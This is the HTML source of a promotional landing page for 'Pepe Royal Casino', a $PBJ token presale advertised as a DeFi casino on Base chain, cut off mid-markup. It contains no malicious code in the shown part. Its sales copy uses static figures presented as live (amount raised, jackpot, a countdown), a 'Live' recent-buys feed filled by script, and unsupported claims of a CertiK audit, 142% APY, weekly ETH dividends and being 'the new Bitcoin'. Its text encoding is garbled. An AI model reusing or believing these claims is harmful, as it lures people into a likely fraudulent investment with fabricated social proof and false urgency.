<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <!-- Viewport estricto para evitar zoom y scroll el치stico en m칩vil -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Pepe Royal Casino | $PBJ VIP Presale</title>
    <meta name="description" content="The First DeFi Casino on Base Chain. Own the House.">
    
    <!-- Librer칤as Externas -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <!-- Confetti Library -->
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@300;400;600;700;900&family=Inter:wght@400;500;700;900&display=swap" rel="stylesheet">
    
    <!-- Configuraci칩n Tailwind: ROYAL GOLD -->
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'pepe-base': '#050505',
                        'pepe-panel': '#121212',
                        'pepe-card': '#1a1a1a',
                        'royal-gold': '#FFD700',
                        'royal-dim': 'rgba(255, 215, 0, 0.1)',
                    },
                    fontFamily: {
                        'display': ['Chakra Petch', 'sans-serif'],
                        'body': ['Inter', 'sans-serif'],
                    },
                    animation: {
                        'pulse-slow': 'pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite',
                        'shine': 'shine 2s infinite',
                        'marquee': 'marquee 25s linear infinite',
                        'float': 'float 6s ease-in-out infinite',
                    },
                    keyframes: {
                        marquee: {
                            '0%': { transform: 'translateX(100%)' },
                            '100%': { transform: 'translateX(-100%)' },
                        },
                        shine: {
                            '0%': { backgroundPosition: '-100%' },
                            '100%': { backgroundPosition: '200%' },
                        },
                        float: {
                            '0%, 100%': { transform: 'translateY(0)' },
                            '50%': { transform: 'translateY(-10px)' },
                        }
                    }
                }
            }
        }
    </script>

    <style>
        /* --- ESTILOS ROYAL GOLD --- */
        :root {
            --primary: #FFD700; 
            --primary-dark: #B8860B;
            --glass-border: 1px solid rgba(255, 215, 0, 0.15);
        }

        body { 
            background-color: #020202;
            background-image: url("https://www.transparenttextures.com/patterns/carbon-fibre.png");
            color: #d1d5db; 
            font-family: 'Inter', sans-serif; 
            overflow: hidden; 
            height: 100vh;
            height: 100dvh; /* Soporte altura din치mica m칩vil */
            overscroll-behavior-y: none; /* FIX: Evita el rebote el치stico en iOS */
        }

        /* Particles */
        .particles {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-image: radial-gradient(#FFD700 1px, transparent 1px);
            background-size: 40px 40px;
            opacity: 0.15;
            z-index: -1;
            pointer-events: none;
            animation: particleMove 60s linear infinite;
        }
        @keyframes particleMove {
            0% { background-position: 0 0; }
            100% { background-position: 40px 40px; }
        }

        h1, h2, h3, .brand-font { font-family: 'Chakra Petch', sans-serif; text-transform: uppercase; letter-spacing: 0.05em; }

        /* Scrollbar Stealth */
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-track { background: #050505; }
        ::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }

        /* Panels Lujo */
        .glass-panel { 
            background: rgba(18, 18, 18, 0.95); 
            backdrop-filter: blur(5px); 
            border: var(--glass-border);
            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.5);
        }

        /* Texto Dorado */
        .text-gold { 
            color: var(--primary); 
            text-shadow: 0 0 15px rgba(255, 215, 0, 0.3);
        }
        
        .text-gradient-gold {
            background: linear-gradient(135deg, #FFF8DC 0%, #FFD700 50%, #B8860B 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        /* Bot칩n de Compra VIP */
        .btn-gold {
            background: linear-gradient(135deg, #FFD700 0%, #FDB931 50%, #B8860B 100%);
            color: black;
            font-family: 'Chakra Petch', sans-serif;
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 1px;
            border: 1px solid #FFE4B5;
            box-shadow: 0 0 15px rgba(255, 215, 0, 0.4);
            transition: all 0.3s ease;
        }
        .btn-gold:hover { 
            transform: translateY(-2px); 
            box-shadow: 0 0 30px rgba(255, 215, 0, 0.6); 
            filter: brightness(1.1);
        }
        .btn-gold:disabled { opacity: 0.5; cursor: not-allowed; filter: grayscale(1); }

        /* Range Slider */
        input[type=range] { -webkit-appearance: none; background: transparent; }
        input[type=range]::-webkit-slider-thumb {
            -webkit-appearance: none; height: 16px; width: 16px; border-radius: 50%; background: #FFD700; cursor: pointer; margin-top: -6px; box-shadow: 0 0 10px #FFD700;
        }
        input[type=range]::-webkit-slider-runnable-track {
            width: 100%; height: 4px; cursor: pointer; background: #333; border-radius: 2px;
        }

        /* Layout Grid */
        .app-layout { 
            display: grid; 
            grid-template-columns: 260px 1fr 300px; 
            grid-template-rows: 80px 1fr; 
            height: 100%;
        }
        
        @media (max-width: 1280px) {
            .app-layout { grid-template-columns: 260px 1fr 0px; }
            .chat-sidebar { transform: translateX(100%); position: fixed; right: 0; height: 100vh; z-index: 60; width: 300px; transition: 0.3s; background: #050505; border-left: 1px solid #333; }
            .chat-sidebar.open { transform: translateX(0); }
        }
        @media (max-width: 1024px) {
            .app-layout { grid-template-columns: 0px 1fr 0px; }
            .sidebar { transform: translateX(-100%); position: fixed; height: 100vh; z-index: 60; width: 260px; transition: 0.3s; background: #050505; border-right: 1px solid #333; }
            .sidebar.open { transform: translateX(0); }
        }

        .sidebar { grid-row: 1 / -1; grid-column: 1; border-right: 1px solid rgba(255,255,255,0.05); display: flex; flex-direction: column; background: #080808; }
        .header { grid-column: 2 / -1; grid-row: 1; z-index: 40; border-bottom: 1px solid rgba(255,255,255,0.05); background: rgba(5, 5, 5, 0.9); backdrop-filter: blur(10px); }
        .content-viewport { grid-column: 2; grid-row: 2; position: relative; overflow-y: auto; overflow-x: hidden; }
        .chat-sidebar { grid-row: 2; grid-column: 3; border-left: 1px solid rgba(255,255,255,0.05); background: #080808; display: flex; flex-direction: column; }

        /* Ticker Tape */
        .ticker-wrap {
            position: absolute; top: 0; left: 0; width: 100%; overflow: hidden; height: 26px; background: #FFD700; color: black; z-index: 50; line-height: 26px; border-bottom: 1px solid #B8860B;
        }
        .ticker-move { display: inline-block; white-space: nowrap; animation: marquee 30s linear infinite; }
        .ticker-item { display: inline-block; padding: 0 2rem; font-weight: 800; font-family: 'Chakra Petch'; text-transform: uppercase; font-size: 11px; letter-spacing: 1px; }

        /* Game Card */
        .game-card { border: 1px solid rgba(255,255,255,0.05); transition: 0.3s; background: #121212; }
        .game-card:hover { border-color: var(--primary); box-shadow: 0 0 20px rgba(255, 215, 0, 0.15); transform: translateY(-3px); }

        /* Toast */
        .live-toast { animation: slideIn 0.4s ease-out, fadeOut 0.4s ease-in 4.5s forwards; border-left: 3px solid var(--primary); }
        @keyframes slideIn { from { transform: translateX(-100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
        @keyframes fadeOut { to { opacity: 0; transform: translateY(10px); } }

        /* FIX PARA JUEGOS EN M칍VIL: Ocupar pantalla completa sobre todo lo dem치s */
        .game-frame-container {
            position: fixed;
            inset: 0;
            width: 100%;
            height: 100%;
            z-index: 100; /* Encima del header, footer y botones */
            background: #020202;
            display: flex;
            flex-direction: column;
        }
        .game-frame-container.hidden { display: none; }

        @keyframes slideDownFade {
    0% { transform: translateY(-10px); opacity: 0; }
    100% { transform: translateY(0); opacity: 1; }
}
.animate-slideDown {
    animation: slideDownFade 0.5s ease-out forwards;
}

        /* Custom Scrollbar para el Roadmap */
.custom-scrollbar::-webkit-scrollbar {
    width: 6px;
}
.custom-scrollbar::-webkit-scrollbar-track {
    background: #1a1a1a; 
}
.custom-scrollbar::-webkit-scrollbar-thumb {
    background: #333; 
    border-radius: 3px;
}
.custom-scrollbar::-webkit-scrollbar-thumb:hover {
    background: #FFD700; 
}
    </style>
</head>
<body>
    
    <!-- Dynamic Background -->
    <div class="particles"></div>

    <div class="app-layout" id="appLayout">
        
        <!-- TICKER TAPE -->
        <div class="ticker-wrap" id="mainTicker">
            <div class="ticker-move">
                <div class="ticker-item"><i class="fas fa-crown"></i> VIP PRESALE ACTIVE</div>
                <div class="ticker-item">游눯 $PBJ IS THE NEW BITCOIN ON BASE</div>
                <div class="ticker-item">游 HIGH ROLLERS ONLY</div>
                <div class="ticker-item">游 AUDITED & SECURE</div>
                <div class="ticker-item">游 50% REVENUE SHARE</div>
                <div class="ticker-item">游눯 BECOME THE HOUSE</div>
            </div>
        </div>

        <!-- 1. LEFT SIDEBAR -->
        <nav id="sidebar" class="sidebar pt-8 bg-black/80 backdrop-blur-md border-r border-white/5 relative z-40">
    <!-- Efecto de luz lateral sutil -->
    <div class="absolute top-0 left-0 w-[1px] h-full bg-gradient-to-b from-transparent via-gold/20 to-transparent"></div>
            <div class="p-6 flex items-center gap-3 cursor-pointer border-b border-white/5 bg-[#080808] mb-2" onclick="showSection('home')">
                <div class="relative w-12 h-12 group">
                    <img src="https://cryptologos.cc/logos/pepe-pepe-logo.png" class="w-full h-full object-contain filter drop-shadow-[0_0_8px_rgba(255,215,0,0.5)] group-hover:scale-110 transition">
                </div>
                <div>
                    <h1 class="text-2xl font-black text-white leading-none brand-font italic tracking-tighter">PEPE<span class="text-gold">ROYAL</span></h1>
                    <span class="text-[9px] text-yellow-500 font-bold uppercase tracking-widest px-1 rounded border border-yellow-500/20">VIP Casino</span>
                </div>
            </div>

            <div class="px-4 mb-4 mt-2">
                <button onclick="document.getElementById('homeSection').scrollIntoView({behavior: 'smooth'})" class="w-full btn-gold py-3 rounded text-xs shadow-lg animate-pulse-slow">
                    <i class="fas fa-gem mr-2"></i> JOIN PRESALE
                </button>
            </div>

            <div class="flex-1 overflow-y-auto px-4 space-y-1">
                <p class="px-2 text-[10px] font-bold text-yellow-600/70 uppercase mb-2 mt-4 tracking-wider">The Suite</p>
                <button onclick="showSection('home')" class="w-full text-left flex items-center gap-3 p-3 rounded-lg hover:bg-white/5 text-gray-400 hover:text-white transition group border border-transparent hover:border-yellow-500/30">
                    <i class="fas fa-home text-yellow-600 group-hover:text-gold transition"></i> Lobby
                </button>
                <button onclick="showSection('profile')" class="w-full text-left flex items-center gap-3 p-3 rounded-lg hover:bg-white/5 text-gray-400 hover:text-white transition group border border-transparent hover:border-yellow-500/30">
                    <i class="fas fa-wallet text-yellow-600 group-hover:text-gold transition"></i> Bankroll
                </button>
                <button onclick="showSection('nft')" class="w-full text-left flex items-center gap-3 p-3 rounded-lg hover:bg-white/5 text-gray-400 hover:text-white transition group border border-transparent hover:border-yellow-500/30">
                    <i class="fas fa-credit-card text-yellow-600 group-hover:text-gold transition"></i> Membership Cards
                </button>
                <button onclick="showSection('partners')" class="w-full text-left flex items-center gap-3 p-3 rounded-lg hover:bg-white/5 text-gray-400 hover:text-white transition group border border-transparent hover:border-yellow-500/30">
                    <i class="fas fa-users text-yellow-600 group-hover:text-gold transition"></i> Affiliate Club
                </button>
                
                <!-- NEW ROADMAP BUTTON -->
                <button onclick="showRoadmap()" class="w-full text-left flex items-center gap-3 p-3 rounded-lg hover:bg-white/5 text-gray-400 hover:text-white transition group border border-transparent hover:border-yellow-500/30">
                    <i class="fas fa-map-signs text-yellow-600 group-hover:text-gold transition"></i> Roadmap
                </button>

                <p class="px-2 text-[10px] font-bold text-yellow-600/70 uppercase mb-2 mt-6 tracking-wider">Gaming Floor</p>
                <button onclick="loadGame('games/plinko.html', 'Plinko')" class="w-full text-left flex items-center gap-3 p-3 rounded-lg hover:bg-white/5 text-gray-400 hover:text-white transition group">
                    <i class="fas fa-caret-down text-gray-500 group-hover:text-gold w-5"></i> Plinko
                </button>
                <button onclick="loadGame('games/crash.html', 'Crash')" class="w-full text-left flex items-center gap-3 p-3 rounded-lg hover:bg-white/5 text-gray-400 hover:text-white transition group">
                    <i class="fas fa-rocket text-gray-500 group-hover:text-gold w-5"></i> Crash
                </button>
                <button onclick="loadGame('games/blackjack.html', 'Blackjack')" class="w-full text-left flex items-center gap-3 p-3 rounded-lg hover:bg-white/5 text-gray-400 hover:text-white transition group">
                    <i class="fas fa-heart text-gray-500 group-hover:text-gold w-5"></i> Blackjack
                </button>
                <button onclick="loadGame('games/mines.html', 'Mines')" class="w-full text-left flex items-center gap-3 p-3 rounded-lg hover:bg-white/5 text-gray-400 hover:text-white transition group">
                    <i class="fas fa-bomb text-gray-500 group-hover:text-gold w-5"></i> Mines
                </button>
                <button onclick="loadGame('games/dice.html', 'Dice')" class="w-full text-left flex items-center gap-3 p-3 rounded-lg hover:bg-white/5 text-gray-400 hover:text-white transition group">
                    <i class="fas fa-dice text-gray-500 group-hover:text-gold w-5"></i> Dice
                </button>
                <button onclick="loadGame('games/limbo.html', 'Limbo')" class="w-full text-left flex items-center gap-3 p-3 rounded-lg hover:bg-white/5 text-gray-400 hover:text-white transition group">
                <i class="fas fa-rocket text-gray-500 group-hover:text-gold w-5"></i> Limbo
                </button>
            </div>
            
            <div class="p-4 border-t border-white/5 text-xs bg-[#080808] text-center">
                <p class="text-[10px] text-gray-600 font-mono">POWERED BY BASE CHAIN</p>
            </div>
        </nav>

        <!-- 2. HEADER -->
        <header class="header flex flex-col justify-center pt-6">
            <div class="flex items-center justify-between px-6 h-full w-full max-w-[1920px] mx-auto">
                <div class="flex items-center gap-4">
                    <button onclick="toggleSidebar()" class="lg:hidden text-white text-xl hover:text-gold"><i class="fas fa-bars"></i></button>
                    <span class="lg:hidden font-black text-white brand-font text-xl italic tracking-tighter">PEPE<span class="text-gold">ROYAL</span></span>
                </div>

                <!-- Wallet Display Center -->
                <div class="hidden md:flex items-center gap-2 bg-[#121212] border border-white/10 p-1 rounded-lg shadow-xl absolute left-1/2 transform -translate-x-1/2">
                    <div class="flex items-center gap-2 px-4 py-1.5 border-r border-white/5">
                        <i class="fab fa-ethereum text-gray-500"></i>
                        <div class="flex flex-col leading-none">
                            <span class="text-[9px] text-gray-500 font-bold uppercase">ETH</span>
                            <span class="font-mono font-bold text-gray-200 text-xs" id="headerWalletBal">0.00</span>
                        </div>
                    </div>
                    <div class="flex items-center gap-2 px-4 py-1.5 cursor-pointer hover:bg-white/5 rounded-lg transition" onclick="showSection('profile')">
                        <i class="fas fa-coins text-gold"></i>
                        <div class="flex flex-col leading-none">
                            <span class="text-[9px] text-gray-500 font-bold uppercase">$PBJ Chips</span>
                            <span class="font-mono font-bold text-gold text-sm" id="headerGameBal">0.00</span>
                        </div>
                    </div>
                </div>
                
                <div class="flex gap-4 items-center ml-auto">
                    <div id="userInfo" class="hidden sm:flex items-center gap-3 cursor-pointer hover:opacity-80 transition" onclick="showSection('profile')">
                        <div class="text-right hidden md:block">
                            <p class="text-xs font-bold text-white leading-none mb-1" id="userNameDisplay">Connect</p>
                            <p class="text-[10px] text-gold leading-none font-bold">GUEST</p>
                        </div>
                        <img id="headerAvatar" src="https://api.dicebear.com/9.x/avataaars/svg?seed=Pepe" class="w-9 h-9 rounded bg-[#1a242d] border border-gold/50">
                    </div>
                    
                    <button id="connectBtnHeader" onclick="connectWallet()" class="hidden md:flex bg-white text-black hover:bg-gray-200 px-5 py-2.5 rounded text-xs font-black shadow-[0_0_15px_rgba(255,215,0,0.2)] transition items-center gap-2 font-display uppercase tracking-wider">
                        <i class="fas fa-wallet"></i> Wallet
                    </button>
                    
                    <button onclick="toggleChat()" class="w-10 h-10 flex items-center justify-center rounded bg-[#121212] border border-white/10 text-gray-400 hover:text-white hover:border-gold/50 transition relative">
                        <i class="fas fa-comments"></i>
                        <span class="absolute top-2 right-2 w-2 h-2 bg-red-500 rounded-full animate-pulse"></span>
                    </button>
                </div>
            </div>
        </header>

        <!-- 3. MAIN CONTENT -->
        <main class="content-viewport custom-scrollbar flex flex-col relative pb-20">
            
            <div id="liveToastContainer" class="fixed bottom-20 left-6 z-50 flex flex-col-reverse gap-3 pointer-events-none"></div>

            <!-- HOME SECTION -->
            <div id="homeSection" class="w-full max-w-[1200px] mx-auto p-4 md:p-8 fade-in flex-1">
                
                <!-- HERO: TOKEN SALE -->
                <div class="flex flex-col items-center justify-center py-8 mb-4 relative">
                    <div class="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-[600px] h-[600px] bg-yellow-600/10 rounded-full blur-[100px] pointer-events-none -z-10"></div>
                    
                    <span class="px-4 py-1 rounded bg-yellow-500/10 text-yellow-500 border border-yellow-500/20 text-[10px] font-bold uppercase mb-4 tracking-widest animate-bounce">
                        <i class="fas fa-bolt mr-1"></i> Phase 1 Almost Sold Out
                    </span>
                    
                    <h1 class="text-5xl md:text-7xl font-black text-white text-center leading-none brand-font mb-4 drop-shadow-2xl">
                        THE FIRST <span class="text-gradient-gold">DEFI CASINO</span>
                        <br>ON BASE CHAIN
                    </h1>
                    
                    <p class="text-gray-400 text-base md:text-lg text-center max-w-xl mb-8">
                        The house always wins. Now, <span class="text-white font-bold">you represent the house</span>.
                        Purchase chips to play or stake to earn 50% of the casino profits.
                    </p>

                    <!-- SWAP CARD -->
                    <div class="w-full max-w-md relative z-20 animate-float">
                        <div class="absolute -inset-0.5 bg-gradient-to-b from-yellow-500 to-transparent rounded-2xl blur opacity-30"></div>
                        <div class="relative bg-[#121212] rounded-xl border border-white/10 p-1 shadow-2xl">
                            <div class="bg-[#0e0e0e] rounded-lg p-6">
                                <!-- URGENCY TIMER -->
                                <div class="flex justify-between items-center mb-4 bg-yellow-500/5 border border-yellow-500/10 rounded p-2">
                                    <div class="text-[10px] text-yellow-500 uppercase font-bold animate-pulse">
                                        <i class="fas fa-clock mr-1"></i> Price Increases In:
                                    </div>
                                    <div class="font-mono text-white font-bold text-sm" id="countdownTimer">04:23:12</div>
                                </div>

                                <div class="flex justify-between items-center mb-4">
                                    <h3 class="text-xl font-bold text-white uppercase tracking-widest text-gold"><i class="fas fa-exchange-alt mr-2"></i> Presale</h3>
                                    <div class="flex bg-black rounded p-1 border border-white/5">
                                        <button class="px-4 py-1 rounded bg-[#222] text-white font-bold text-[10px] border border-white/10" id="tabBuy" onclick="toggleSwapMode('buy')">BUY</button>
                                        <button class="px-4 py-1 rounded text-gray-500 font-bold text-[10px] hover:text-white" id="tabSell" onclick="toggleSwapMode('sell')">SELL</button>
                                    </div>
                                </div>

                                <div class="mb-2">
                                    <div class="flex justify-between text-[10px] font-bold text-gray-500 mb-1 uppercase tracking-wide">
                                        <span>Total Raised</span>
                                        <span class="text-gold" id="raisedAmount">$4,280,105 / $5M</span>
                                    </div>
                                    <div class="w-full h-3 bg-[#222] rounded-full overflow-hidden relative">
                                        <div class="h-full bg-gradient-to-r from-yellow-700 to-yellow-400 w-[82%] shadow-[0_0_10px_#FFD700] relative">
                                            <div class="absolute top-0 left-0 w-full h-full bg-[linear-gradient(45deg,rgba(255,255,255,0.2)_25%,transparent_25%,transparent_50%,rgba(255,255,255,0.2)_50%,rgba(255,255,255,0.2)_75%,transparent_75%,transparent)] bg-[length:1rem_1rem] animate-[marquee_1s_linear_infinite]"></div>
                                        </div>
                                    </div>
                                    <div class="flex justify-between text-[9px] text-gray-600 mt-1">
                                        <span>Current: $0.0025</span>
                                        <span class="text-gold">Next: $0.0030</span>
                                    </div>
                                </div>

                                <div class="space-y-3 mt-4">
                                    <div class="bg-[#050505] p-3 rounded border border-white/10 hover:border-yellow-500/30 transition">
                                        <div class="flex justify-between text-[10px] text-gray-500 font-bold uppercase mb-1">
                                            <span id="labelInputA">Pay (ETH)</span>
                                            <span>Bal: <span id="balInputA" class="text-gray-300">0.00</span></span>
                                        </div>
                                        <div class="flex items-center gap-2">
                                            <input type="number" id="inputA" placeholder="0.0" class="bg-transparent w-full text-xl font-bold text-white outline-none" oninput="handleInputA()">
                                            <button onclick="setMaxETH()" class="text-[10px] bg-yellow-500/20 text-gold hover:bg-gold hover:text-black px-2 py-1 rounded font-bold transition">MAX</button>
                                            <div class="flex items-center gap-1 bg-[#1a1a1a] px-2 py-1 rounded border border-white/10 text-xs text-gray-300">
                                                <i class="fab fa-ethereum"></i> ETH
                                            </div>
                                        </div>
                                    </div>

                                    <div class="flex justify-center -my-5 relative z-10">
                                        <div class="bg-[#121212] p-1.5 rounded-full border border-white/10 text-gold shadow-lg">
                                            <i class="fas fa-arrow-down text-xs"></i>
                                        </div>
                                    </div>

                                    <div class="bg-[#050505] p-3 rounded border border-white/10 hover:border-yellow-500/30 transition">
                                        <div class="flex justify-between text-[10px] text-gray-500 font-bold uppercase mb-1">
                                            <span>Receive ($PBJ)</span>
                                        </div>
                                        <div class="flex items-center gap-2">
                                            <input type="number" id="inputB" placeholder="0.0" class="bg-transparent w-full text-xl font-bold text-gold outline-none" oninput="handleInputB()">
                                            <div class="flex items-center gap-1 bg-[#1a1a1a] px-2 py-1 rounded border border-white/10 text-xs text-gray-300">
                                                <span class="text-xs">游냦</span> PBJ
                                            </div>
                                        </div>
                                    </div>
                                </div>

                                <!-- CROSS-CHAIN TOGGLE -->
<div class="flex justify-between items-center mb-4 bg-[#1a1a1a] p-2 rounded border border-white/5">
    <span class="text-[10px] text-gray-400 font-bold ml-1">Don't have ETH on Base?</span>
    <button onclick="openBridgeModal()" class="bg-blue-600/20 text-blue-400 border border-blue-500/30 hover:bg-blue-600 hover:text-white transition text-[9px] font-bold uppercase px-3 py-1.5 rounded flex items-center gap-2">
        <i class="fas fa-random"></i> Bridge Assets
    </button>
</div>

                                <!-- BONUS PROGRESS BAR -->
<div class="mt-4 mb-2">
    <div class="flex justify-between text-[9px] uppercase font-bold text-gray-500 mb-1">
        <span>Current Bonus: <span id="currentBonus" class="text-white">0%</span></span>
        <span>Next Tier: <span class="text-gold">5% (0.5 ETH)</span></span>
    </div>
    <div class="w-full bg-[#050505] h-2 rounded-full border border-white/10 overflow-hidden">
        <div id="bonusBar" class="bg-gradient-to-r from-green-500 to-green-300 h-full w-[0%] transition-all duration-500"></div>
    </div>
    <p class="text-[9px] text-gray-600 mt-1 text-center italic" id="bonusMsg">Add 0.5 ETH more to unlock 5% extra tokens!</p>
</div>

                                <button onclick="handleSwapAction()" id="swapMainBtn" class="btn-gold w-full py-4 rounded mt-6 text-sm font-black shadow-lg">
                                    CONNECT WALLET
                                </button>

                                <button onclick="Swal.fire({
    title: 'How to Buy $PBJ',
    html: '<div class=\'text-left text-sm space-y-3\'>' +
          '<p>1. Download <b>MetaMask</b> or <b>Coinbase Wallet</b>.</p>' +
          '<p>2. Buy <b>ETH</b> on any exchange (Binance, Coinbase) and send it to your wallet address on the <b>BASE NETWORK</b>.</p>' +
          '<p>3. Return here, click Connect Wallet and Swap ETH for $PBJ.</p>' +
          '</div>',
    background: '#121212', color: '#fff', confirmButtonColor: '#FFD700', confirmButtonText: 'GOT IT'
})" class="w-full text-center text-[10px] text-gray-500 mt-3 hover:text-white underline cursor-pointer">
    <i class="fas fa-question-circle"></i> New? How to buy Guide
</button>

                                <!-- CONTRACT ADDRESS BAR -->
<div class="flex justify-center mt-6 mb-2">
    <div class="bg-[#0a0a0a] border border-white/10 rounded-full px-4 py-1.5 flex items-center gap-3 cursor-pointer group hover:border-gold/50 transition" onclick="navigator.clipboard.writeText('0xff4b4f2076F39550e2C5fD44cb2024Eb06B944E5'); Swal.fire({toast:true, position:'top', icon:'success', title:'Copied!', showConfirmButton:false, timer:1000, background:'#121212', color:'#fff'})">
        <span class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span>
        <span class="text-[10px] text-gray-400 font-mono">CA: 0xff4b...44E5</span>
        <i class="fas fa-copy text-gray-600 group-hover:text-gold text-xs"></i>
    </div>
</div>

                                                                <!-- INICIO BLOQUE RECENT BUYS -->
                                <div class="mt-4 border-t border-white/5 pt-3">
                                    <div class="flex justify-between items-center mb-2">
                                        <span class="text-[9px] text-gray-500 uppercase font-bold">Recent Buys</span>
                                        <div class="flex items-center gap-1">
                                            <span class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></span>
                                            <span class="text-[9px] text-green-500">Live</span>
                                        </div>
                                    </div>
                                    <div id="recentBuysList" class="space-y-2 h-20 overflow-hidden relative">
                                        <!-- JS inyectar치 las compras aqu칤 -->
                                    </div>
                                </div>
                                <!-- FIN BLOQUE RECENT BUYS -->
                                
                                <div class="mt-6 border-t border-white/10 pt-4">
                                    <p class="text-[10px] text-gray-500 uppercase font-bold mb-2 flex justify-between">
                                        <span>Passive Income Calculator</span>
                                        <span class="text-green-500">APY: 142%</span>
                                    </p>
                                    <input type="range" min="10000" max="1000000" step="10000" value="50000" class="w-full h-1 bg-gray-700 rounded-lg appearance-none cursor-pointer mb-2" oninput="updateCalc(this.value)">
                                    <div class="flex justify-between items-end">
                                        <div>
                                            <span class="text-[9px] text-gray-400">If you hold:</span>
                                            <div class="text-white font-bold text-xs"><span id="calcHold">50,000</span> $PBJ</div>
                                        </div>
                                        <div class="text-right">
                                            <span class="text-[9px] text-gray-400">Weekly Earnings:</span>
                                            <div class="text-gold font-black text-lg">~ <span id="calcEarn">0.45</span> ETH</div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="flex flex-wrap justify-center items-center gap-8 opacity-40 mb-16 grayscale hover:grayscale-0 transition duration-500">
                    <div class="flex items-center gap-2 text-xl font-bold font-display"><i class="fas fa-circle text-blue-500"></i> BASE</div>
                    <div class="flex items-center gap-2 text-xl font-bold font-display"><i class="fas fa-shield-alt text-green-500"></i> CERTIK</div>
                    <div class="flex items-center gap-2 text-xl font-bold font-display"><i class="fas fa-search-dollar text-pink-500"></i> DEXTools</div>
                    <div class="flex items-center gap-2 text-xl font-bold font-display"><i class="fas fa-exchange-alt text-purple-500"></i> Uniswap</div>
                </div>

                <!-- GLOBAL JACKPOT COUNTER -->
<div class="w-full max-w-4xl mx-auto mb-16 mt-8 p-1">
    <div class="bg-gradient-to-r from-transparent via-[#121212] to-transparent border-y border-white/5 py-4 text-center relative overflow-hidden">
        <div class="absolute inset-0 bg-gold/5 blur-xl animate-pulse"></div>
        <p class="text-[10px] text-gray-400 font-bold uppercase tracking-[0.3em] mb-1 relative z-10">Current Casino Jackpot</p>
        <div class="flex justify-center items-center gap-2 relative z-10">
            <span class="text-gold text-2xl md:text-4xl font-black brand-font text-shadow">$</span>
            <span id="globalJackpot" class="text-white text-3xl md:text-5xl font-black brand-font tracking-tighter">4,820,192.45</span>
        </div>
    </div>
</div>

                <!-- VALUE PROPOSITION -->
                <div class="grid md:grid-cols-3 gap-6 mb-20 mt-10">
                    <div class="glass-panel p-6 rounded relative overflow-hidden group hover:bg-[#151515] transition border-t-2 border-transparent hover:border-gold">
                        <div class="text-gold text-2xl mb-3"><i class="fas fa-chart-line"></i></div>
                        <h3 class="text-sm font-bold text-white uppercase mb-2 tracking-wider">Passive Income</h3>
                        <p class="text-xs text-gray-400 leading-relaxed">Stake $PBJ to earn ETH. The casino profits are distributed to holders every week.</p>
                    </div>
                    <div class="glass-panel p-6 rounded relative overflow-hidden group hover:bg-[#151515] transition border-t-2 border-transparent hover:border-gold">
                        <div class="text-gold text-2xl mb-3"><i class="fas fa-shield-alt"></i></div>
                        <h3 class="text-sm font-bold text-white uppercase mb-2 tracking-wider">Provably Fair</h3>
                        <p class="text-xs text-gray-400 leading-relaxed">Every transaction is on-chain. Verified by CertiK. Mathematical fairness guaranteed.</p>
                    </div>
                    <div class="glass-panel p-6 rounded relative overflow-hidden group hover:bg-[#151515] transition border-t-2 border-transparent hover:border-gold">
                        <div class="text-gold text-2xl mb-3"><i class="fas fa-gamepad"></i></div>
                        <h3 class="text-sm font-bold text-white uppercase mb-2 tracking-wider">Live Utility</h3>
                        <p class="text-xs text-gray-400 leading-relaxed">The token isn't just a meme. It's the currency of the casino. Demand is driven by players.</p>
                    </div>
                </div>
                
                                <!-- NFT TEASER SECTION -->
                <div class="mb-12">
                    <div class="flex justify-between items-end mb-6">
                        <div>
                            <h3 class="text-2xl font-black text-white brand-font uppercase">Owner <span class="text-gold">Privileges</span></h3>
                            <p class="text-xs text-gray-400">Mint a card to earn daily ETH dividends from casino profits.</p>
                        </div>
                        <button onclick="showSection('nft')" class="text-[10px] text-gold border border-gold/30 px-3 py-1 rounded hover:bg-gold hover:text-black transition">VIEW ALL CARDS</button>
                    </div>
                    
                    <!-- Mini Carousel -->
                    <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
                        <!-- Card 1 -->
                        <div class="bg-[#121212] p-3 rounded border border-gold/20 relative group cursor-pointer" onclick="showSection('nft')">
                            <div class="absolute top-2 right-2 bg-red-600 text-white text-[9px] font-bold px-2 rounded animate-pulse">HOT</div>
                            <img src="assets/img/nft-rare.png" class="w-full rounded mb-3 opacity-80 group-hover:opacity-100 transition">
                            <div class="text-center">
                                <p class="text-gold font-bold text-xs uppercase">Gold Tier</p>
                                <p class="text-[10px] text-gray-500">25,000 PBJ</p>
                            </div>
                        </div>
                        <!-- Card 2 -->
                        <div class="bg-[#121212] p-3 rounded border border-white/5 relative group cursor-pointer" onclick="showSection('nft')">
                            <div class="absolute top-2 right-2 bg-gray-700 text-white text-[9px] font-bold px-2 rounded">low stock</div>
                            <img src="assets/img/nft-epic.png" class="w-full rounded mb-3 opacity-80 group-hover:opacity-100 transition">
                            <div class="text-center">
                                <p class="text-purple-400 font-bold text-xs uppercase">Platinum Tier</p>
                                <p class="text-[10px] text-gray-500">50,000 PBJ</p>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- GAMES SECTION PRO -->
<div class="border-t border-white/5 pt-10">
    <div class="flex items-center justify-between mb-8">
        <div>
